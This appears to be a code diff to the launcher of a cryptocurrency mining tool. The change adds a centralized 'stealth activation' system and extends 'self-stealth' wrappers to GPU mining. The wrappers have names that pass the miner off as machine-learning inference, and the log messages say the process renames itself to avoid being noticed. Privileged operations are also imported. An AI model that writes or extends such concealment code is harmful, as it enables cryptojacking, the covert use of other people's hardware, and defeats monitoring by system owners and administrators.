@@ -44,6 +44,9 @@ from mining_environment.scripts.auxiliary_modules.models import ConfigModel
 from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 
+# **Import** (nhập khẩu) **Stealth Activation Manager** (trình quản lý kích hoạt ẩn danh – centralized stealth system)
+from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
+
 # **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
 from mining_environment.logging.mining_performance_logger import (
     register_mining_process,
@@ -187,17 +190,25 @@ def start_resource_manager():
             logger.info("✅ Configuration loaded successfully")
             
             # **Step 2**: Initialize EventBus với **memory backend** (bộ xử lý bộ nhớ)
-            logger.info("📋 Step 2/4: Initializing EventBus with memory backend...")
+            logger.info("📋 Step 2/5: Initializing EventBus with memory backend...")
             event_bus = EventBus()
             logger.info("✅ EventBus initialized successfully")
             
+            # **Step 2.5**: Initialize Stealth Activation Manager với **EventBus integration** (tích hợp EventBus)
+            logger.info("📋 Step 2.5/5: Initializing Stealth Activation Manager...")
+            stealth_init_success = initialize_stealth_activation(event_bus)
+            if stealth_init_success:
+                logger.info("✅ Stealth Activation Manager initialized successfully")
+            else:
+                logger.warning("⚠️ Stealth Activation Manager initialization failed - continuing without external stealth")
+            
             # **Step 3**: Create ResourceManager instance
-            logger.info("📋 Step 3/4: Creating ResourceManager instance...")
+            logger.info("📋 Step 3/5: Creating ResourceManager instance...")
             resource_manager = ResourceManager(config, event_bus, logger)
             logger.info("✅ ResourceManager instance created")
             
             # **Step 4**: Start ResourceManager
-            logger.info("📋 Step 4/4: Starting ResourceManager...")
+            logger.info("📋 Step 4/5: Starting ResourceManager...")
             resource_manager.start()
             logger.info("🎯 ResourceManager đã được khởi động thành công")
             
@@ -476,17 +487,26 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
             logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
         try:
             # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
-            if enable_stealth and cpu:
-                # **Self-Stealth subprocess** (tiến trình con tự ẩn danh) - sử dụng stealth wrapper
-                stealth_wrapper_path = os.path.join(
-                    os.path.dirname(os.path.abspath(__file__)),
-                    "mining_environment", "scripts", "stealth_ml_inference.py"
-                )
+            if enable_stealth:
+                # **Unified Self-Stealth subprocess** (tiến trình con tự ẩn danh thông nhất) - sử dụng stealth wrapper cho cả CPU & GPU
+                if cpu:
+                    # **CPU Stealth Wrapper** (wrapper ẩn danh CPU) - consolidated path
+                    stealth_wrapper_path = os.path.join(
+                        os.path.dirname(os.path.abspath(__file__)),
+                        "mining_environment", "stealth", "wrappers", "stealth_ml_inference.py"
+                    )
+                else:
+                    # **GPU Stealth Wrapper** (wrapper ẩn danh GPU) 
+                    stealth_wrapper_path = os.path.join(
+                        os.path.dirname(os.path.abspath(__file__)),
+                        "mining_environment", "stealth", "wrappers", "stealth_inference_cuda.py"
+                    )
                 
                 if os.path.exists(stealth_wrapper_path):
                     # Sử dụng **[Self-Stealth Wrapper]** (wrapper tự ẩn danh) thay vì external spoof
                     stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
-                    logger.info(f"🔒 [SELF-STEALTH] Using stealth wrapper: {stealth_wrapper_path}")
+                    miner_type = 'CPU' if cpu else 'GPU'
+                    logger.info(f"🔒 [SELF-STEALTH] Using {miner_type} stealth wrapper: {stealth_wrapper_path}")
                     
                     process = subprocess.Popen(
                         stealth_command,
@@ -496,12 +516,13 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         bufsize=1
                     )
                     if process:
-                        logger.info(f"✅ [SELF-STEALTH] Stealth process started with PID: {process.pid}")
-                        logger.info(f"🔍 [SELF-STEALTH] Process will self-rename using internal stealth manager")
+                        logger.info(f"✅ [SELF-STEALTH] {miner_type} stealth process started with PID: {process.pid}")
+                        logger.info(f"🔍 [SELF-STEALTH] {miner_type} process will self-rename using internal stealth manager")
                 else:
                     # Fallback to standard subprocess nếu wrapper không tồn tại
-                    logger.warning(f"⚠️ [SELF-STEALTH] Stealth wrapper not found: {stealth_wrapper_path}")
-                    logger.warning("⚠️ [SELF-STEALTH] Falling back to standard subprocess - no stealth")
+                    miner_type = 'CPU' if cpu else 'GPU'
+                    logger.warning(f"⚠️ [SELF-STEALTH] {miner_type} stealth wrapper not found: {stealth_wrapper_path}")
+                    logger.warning(f"⚠️ [SELF-STEALTH] Falling back to standard subprocess - no {miner_type} stealth")
                     process = subprocess.Popen(
                         mining_command,
                         stdout=subprocess.PIPE,
@@ -1293,6 +1314,14 @@ def main():
         logger.info("✅ EventBus stopped successfully")
     except Exception as e:
         logger.error(f"❌ Error stopping EventBus: {e}")
+    
+    # **Step 5**: Stealth system cleanup
+    logger.info("📋 Step 5/5: Cleaning up stealth activation system...")
+    try:
+        cleanup_stealth_activation()
+        logger.info("✅ Stealth activation system cleanup completed")
+    except Exception as e:
+        logger.error(f"❌ Error cleaning up stealth activation system: {e}")
     
     # **Cleanup** (dọn dẹp) và thoát
     logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
